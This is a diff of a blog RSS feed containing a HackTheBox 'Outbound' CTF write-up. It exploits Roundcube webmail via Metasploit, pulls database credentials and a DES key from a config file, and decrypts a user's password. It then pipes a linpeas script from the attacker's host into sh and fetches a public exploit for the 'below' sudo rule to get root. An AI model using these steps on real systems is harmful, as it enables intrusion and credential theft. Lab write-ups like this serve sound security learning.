@@ -1,33 +1,306 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Posts on Maaroof Khan (Blog)</title>
+    <title>Posts on MK-WriteUps</title>
     <link>https://Maaroof-Khan10.github.io/posts/</link>
-    <description>Recent content in Posts on Maaroof Khan (Blog)</description>
-    <generator>Hugo</generator>
+    <description>Recent content in Posts on MK-WriteUps</description>
+    <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 10 Aug 2025 16:46:16 +0530</lastBuildDate>
-    <atom:link href="https://Maaroof-Khan10.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <managingEditor>maaroofkhan2004@gmail.com (Maaroof Khan)</managingEditor>
+    <webMaster>maaroofkhan2004@gmail.com (Maaroof Khan)</webMaster>
+    <lastBuildDate>Sun, 10 Aug 2025 16:46:16 +0530</lastBuildDate><atom:link href="https://Maaroof-Khan10.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Outbound [Write-up] - HackTheBox</title>
       <link>https://Maaroof-Khan10.github.io/posts/2/</link>
       <pubDate>Sun, 10 Aug 2025 16:46:16 +0530</pubDate>
+      <author>maaroofkhan2004@gmail.com (Maaroof Khan)</author>
       <guid>https://Maaroof-Khan10.github.io/posts/2/</guid>
       <description>&lt;p&gt;Hello everyone, and welcome to my first-ever write-up!&lt;/p&gt;
 &lt;p&gt;This box seemed pretty straightforward at first, but it wasn&amp;rsquo;t long before it had me begging for mercy. Let&amp;rsquo;s dive in!&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&#34;HackTheBox Task Page&#34; loading=&#34;lazy&#34; src=&#34;https://Maaroof-Khan10.github.io/posts/2/htb_task_page.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;htb_task_page.png&#34; alt=&#34;HackTheBox Task Page&#34;&gt;&lt;/p&gt;
 &lt;p&gt;I booted up the &amp;ldquo;Outbound&amp;rdquo; machine, ready to see what this bad boy had to offer. We&amp;rsquo;re handed credentials right from the start (&lt;code&gt;tyler / LhKL1o9Nm3X2&lt;/code&gt;), which almost certainly means a login portal awaits.&lt;/p&gt;
 &lt;h3 id=&#34;initial-reconnaissance&#34;&gt;Initial Reconnaissance&lt;/h3&gt;
 &lt;p&gt;As is tradition with any HackTheBox machine, the first step is always &lt;code&gt;nmap&lt;/code&gt;.&lt;/p&gt;</description>
+      <content>&lt;p&gt;Hello everyone, and welcome to my first-ever write-up!&lt;/p&gt;
+&lt;p&gt;This box seemed pretty straightforward at first, but it wasn&amp;rsquo;t long before it had me begging for mercy. Let&amp;rsquo;s dive in!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;htb_task_page.png&#34; alt=&#34;HackTheBox Task Page&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I booted up the &amp;ldquo;Outbound&amp;rdquo; machine, ready to see what this bad boy had to offer. We&amp;rsquo;re handed credentials right from the start (&lt;code&gt;tyler / LhKL1o9Nm3X2&lt;/code&gt;), which almost certainly means a login portal awaits.&lt;/p&gt;
+&lt;h3 id=&#34;initial-reconnaissance&#34;&gt;Initial Reconnaissance&lt;/h3&gt;
+&lt;p&gt;As is tradition with any HackTheBox machine, the first step is always &lt;code&gt;nmap&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap -T5 10.10.11.77
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I ran a &lt;code&gt;T5&lt;/code&gt; scan for some quick results.&lt;/p&gt;
+&lt;p&gt;And here’s what we got:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.95 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2025-08-10 16:54 IST
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.11.77
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.16s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; closed tcp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;reset&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp open  ssh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 4.31 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We have a web server on port 80 and SSH on port 22. Seeing SSH usually means we&amp;rsquo;ll be using it later. Now, let&amp;rsquo;s get this box to spill some beans with a more aggressive scan.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap -Pn -p 22,80 -sC -sV 10.10.11.77
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The output was revealing:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.95 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2025-08-10 17:00 IST
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.11.77
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.16s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ssh-hostkey:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http    nginx 1.24.0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: Did not follow redirect to http://mail.outbound.htb/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-server-header: nginx/1.24.0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The web server redirects to &lt;code&gt;http://mail.outbound.htb&lt;/code&gt;, so let&amp;rsquo;s add that to our &lt;code&gt;/etc/hosts&lt;/code&gt; file.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo nano /etc/hosts
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I added the following line:
+&lt;code&gt;10.10.11.77     outbound.htb mail.outbound.htb&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Time to check out this mailing service.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;roundcube_login.png&#34; alt=&#34;Roundcube Login Page&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;roundcube-exploit&#34;&gt;Roundcube Exploit&lt;/h3&gt;
+&lt;p&gt;Here it is, the moment we&amp;rsquo;ve all been waiting for: a login page! Let&amp;rsquo;s use the credentials we were given. Success! We&amp;rsquo;re in, but Tyler&amp;rsquo;s inbox is bone dry. Guess he isn&amp;rsquo;t too popular.&lt;/p&gt;
+&lt;p&gt;A quick look at the &amp;ldquo;About&amp;rdquo; section reveals the software version.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;roundcube_about.png&#34; alt=&#34;Roundcube About Page&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We&amp;rsquo;re dealing with &lt;strong&gt;Roundcube Webmail 1.6.10&lt;/strong&gt;. Before diving down a Google rabbit hole for exploits, my first move is always to fire up &lt;code&gt;metasploit&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo msfconsole
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;search roundcube
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And what do you know, we hit the jackpot! An exploit for our version is available. The exact CVE is &lt;code&gt;CVE‑2025‑49113&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;metasploit_exp.png&#34; alt=&#34;Metasploit Modules&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Time to exploit (rubs hands).
+Used the following steps to run the exploit:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set RHOSTS mail.outbound.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set LHOST tun0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set USERNAME tyler
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set PASSWORD LhKL1o9Nm3X2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;run
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And just like that, we have a meterpreter shell!&lt;/p&gt;
+&lt;h3 id=&#34;finding-juicy-details-post-exploitation&#34;&gt;Finding Juicy Details (Post-Exploitation)&lt;/h3&gt;
+&lt;p&gt;My first order of business on a new machine is always to hunt for passwords and config files.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;find /var -name &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;config&amp;#34;&lt;/span&gt; 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This led me to &lt;code&gt;/var/www/html/roundcube/config&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Peeking into this folder gave away the file &lt;code&gt;config.inc.php&lt;/code&gt; and it contained some spicy details.
+Here is a sneak peak:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$config[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;db_dsnw&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mysql://roundcube:RCDBPass2025@localhost/roundcube&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$config[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;des_key&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rcmail-!24ByteDESkey*Str&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We&amp;rsquo;ve got the MySQL password and a DES key. This will definitely come in handy. Let&amp;rsquo;s check into mysql and see what we get.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mysql -u roundcube -pRCDBPass2025 roundcube
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once we are in we can make basic queries (The responses take their sweet time to show up so be patient here)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use roundcube;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;show&lt;/span&gt; tables;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt; users;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;session&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;this-part-in-my-opinion-was-the-trickiest-of-all-in-this-box&#34;&gt;This part in my opinion was the trickiest of all in this box&lt;/h4&gt;
+&lt;p&gt;The &lt;code&gt;session&lt;/code&gt; table gives us a bunch of base64 encoded session details&lt;/p&gt;
+&lt;p&gt;Using CyberChef, we can decode this data and find something very interesting.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;cyberchef-jacob.png&#34; alt=&#34;CyberChef showing Jacob&amp;rsquo;s credentials&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We found another user, &lt;code&gt;jacob&lt;/code&gt;, and more importantly, his password! The catch? It&amp;rsquo;s encrypted. But wait, we have that DES key from the config file. After a lot of digging, I confirmed that Roundcube uses Triple DES for session data encryption.&lt;/p&gt;
+&lt;p&gt;Here&amp;rsquo;s how to decrypt the password:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Convert the password from base64 to hex&lt;/li&gt;
+&lt;li&gt;Copy the first 8 bytes (They will be your IV - &lt;code&gt;Initialization Vector&lt;/code&gt; for decryption)&lt;/li&gt;
+&lt;li&gt;Enter the first 8 bytes into the IV field (keep it hex) in cyberchef &lt;strong&gt;Triple DES Decrypt&lt;/strong&gt;, along with the des key (set it to utf-8 first)&lt;/li&gt;
+&lt;li&gt;Paste the rest of the hex into the input part (Except the first 8 bytes we used)&lt;/li&gt;
+&lt;li&gt;Get the password&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Here is the decrypted password we get:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;password_decrypt.png&#34; alt=&#34;CyberChef decrypting the password&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h3&gt;
+&lt;p&gt;Now that we have jacob in our control, let&amp;rsquo;s check this lad&amp;rsquo;s account shall we&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;su jacob
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Enter the password&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat /home/jacob/user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We&amp;rsquo;ve got the user flag!&lt;/p&gt;
+&lt;p&gt;Now that we are Jacob let&amp;rsquo;s check the home folder&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd /home/jacob
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It had a mail folder which had a &lt;code&gt;INBOX&lt;/code&gt; folder which contained a file &lt;code&gt;jacob&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat jacob
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Gave us 2 mails,
+One contained the ssh credentials for jacob
+The other said:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&amp;ldquo;We have been experiencing high resource consumption on our main server.
+For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
+Please inform us immediately if you notice any irregularities.&amp;rdquo;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This is a massive clue. It sounds like Jacob has special permissions to run a service as root. Time for a proper shell!&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ssh jacob@10.10.11.77
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now that we have user.txt and a massive clue from that mail lets check how we can escalate.
+Lets use &lt;code&gt;LinPeas&lt;/code&gt; to find something (&lt;code&gt;sudo -l&lt;/code&gt; could also reveal information but linpeas might give additional details)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# On your machine - where linpeas.sh resides&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo python3 -m http.server &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# On victim&amp;#39;s ssh shell&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -L &amp;lt;Your-HTB-IP&amp;gt;/linpeas.sh | sh
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As predicted we got this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User jacob may run the following commands on outbound:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ALL : ALL&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can run the &lt;code&gt;below&lt;/code&gt; command as root without a password. A goldmine, if I ever saw one. This part took me the most time, as I was trying to exploit it manually without success.&lt;/p&gt;
+&lt;p&gt;A quick search online for a &lt;code&gt;below&lt;/code&gt; exploit leads to &lt;code&gt;CVE-2025-27591&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;I found a really cool python exploitation script &lt;a href=&#34;https://github.com/BridgerAlderson/CVE-2025-27591-PoC&#34;&gt;(Check it out)&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;I transferred the script to the victim machine and ran it.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# On your machine&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 -m http.server &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# On the victim&amp;#39;s machine&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget http://&amp;lt;Your-HTB-IP&amp;gt;/exploit.py
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 exploit.py
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And Wham-Bam-Thank-You-Ma&amp;rsquo;am! We got root!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;cover.png&#34; alt=&#34;HTB PWNED&#34;&gt;&lt;/p&gt;
